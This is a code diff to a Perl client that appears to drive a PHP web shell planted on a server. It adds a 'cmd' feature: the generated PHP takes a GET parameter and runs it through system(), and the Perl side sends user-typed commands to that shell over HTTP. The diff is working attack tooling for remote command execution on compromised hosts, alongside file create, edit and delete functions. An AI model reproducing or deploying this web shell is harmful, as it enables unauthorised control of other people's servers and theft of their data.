@@ -20,6 +20,7 @@ my $help=
 \t\tcreate - create a file\n
 \t\tcls - clear terminal\n
 \t\texit - exit terminal\n
+\t\tcmd - send terminal commands\n
 ";
 
 print <<Eop;
@@ -54,6 +55,7 @@ my $lastFolder="";
 my $lj="";
 my $hem="";
 my $h;
+my $cmd;
 
 GetOptions("opt=s"=>\$op,"help"=>\$h);
 
@@ -104,6 +106,7 @@ my $ex_p=chr(36)."p";
 my $ex_code_=chr(36)."code_";
 my $ex_type=chr(36)."type";
 my $ex_path=chr(36)."path";
+my $ex_cmd=chr(36)."cmd";
 my $ex_text=chr(36)."text";
 my $ex_f=chr(36)."f";
 my $ex_r=chr(36)."r";
@@ -142,6 +145,14 @@ DEL_();
 }
 if($ex_type=='edit'){
 EDIT_();
+}
+if($ex_type=='cmd'){
+CMD_();
+}
+
+function CMD_(){
+if(!isset($ex_GET $er_e 'cmd' $er_ee )){exit;}$ex_cmd=$ex_GET $er_e 'cmd' $er_ee ;
+echo system($ex_cmd);
 }
 
 function EDIT_(){
@@ -289,8 +300,30 @@ EDIT_();
 if($command eq "create"){
 EDIT_();
 }
+if($command eq "cmd"){
+CMD_();
+}
 if($command ne "dir" || $command ne "cls" || $command ne "exit" || $command ne "open" || $command ne "mkdir" || $command ne "del" || $command ne "edit"){RETN();}
 
+}
+
+sub CMD_(){
+#NickGuitar.dll//
+
+print "COMMAND=> ";
+$cmd=<STDIN>;
+chomp($cmd);
+
+$gh=$auth."&type=cmd&cmd=".$cmd;
+if($re=HTTP::Request->new(GET=>$gh)){
+$response=$ua->request($re);
+if($response->status_line==$OK_HTTP){
+$htm=$response->decoded_content;
+if($htm ne ""){
+print $htm."\n\n";
+}
+}
+}
 }
 
 sub EDIT_(){
@@ -309,7 +342,7 @@ if($re=HTTP::Request->new(GET=>$gh)){
 $response=$ua->request($re);
 if($response->status_line==$OK_HTTP){
 $htm=$response->decoded_content;
-if($htm eq ""){
+if($htm ne ""){
 print "\n\n[+] $path EDITED WITH SUCCESS\n\n";
 }
 }
